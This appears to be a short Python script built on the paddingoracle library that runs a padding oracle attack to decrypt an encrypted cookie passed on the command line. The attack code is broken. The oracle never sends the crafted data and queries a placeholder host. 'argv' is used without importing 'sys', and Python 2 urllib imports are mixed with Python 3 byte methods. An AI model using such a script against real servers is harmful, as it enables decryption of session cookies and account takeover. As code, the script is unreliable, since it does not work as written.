# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        # Initializing stuff here

    def oracle(self, data, **kwargs):
        somecookie = data.hex()
        response = requests.get("http://my.host/test")
        if response.ok:
            return
        raise BadPaddingException


if __name__ == '__main__':
    encrypted_cookie = bytes.fromhex(argv[1])

    padbuster = PadBuster()
    cookie = padbuster.decrypt(encrypted_cookie, block_size=16)

    print('Decrypted cookie: %s => %s' % (sys.argv[1], cookie))
